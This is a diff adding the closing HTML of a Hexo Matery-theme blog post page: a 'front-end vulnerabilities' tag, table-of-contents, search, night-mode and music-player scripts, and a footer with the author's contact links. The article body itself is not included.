+                    <a href="/tags/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E/">
+                        <span class="chip bg-color">前端漏洞</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
+
+
+<!-- 代码语言 -->
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3'
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2024</span>
+            
+            <a href="/about" target="_blank">Doramer</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">49.5k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+
+
+    <a href="mailto:2657100414@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=2657100414" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 2657100414" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 白天和黑夜主题 -->
+<div class="stars-con">
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>  
+</div>
+
+<script>
+    function switchNightMode() {
+        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
+        setTimeout(function () {
+            $('body').hasClass('DarkMode') 
+            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
+            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
+            
+            setTimeout(function () {
+            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
+                $(this).remove()
+            })
+            }, 2e3)
+        })
+    }
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    
+
+    
+    
+    
+
+    <!-- 雪花特效 -->
+    
+
+    <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
+    
+
+     
+        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
+        <script src="/libs/others/TencentCaptcha.js"></script>
+        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
+    
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
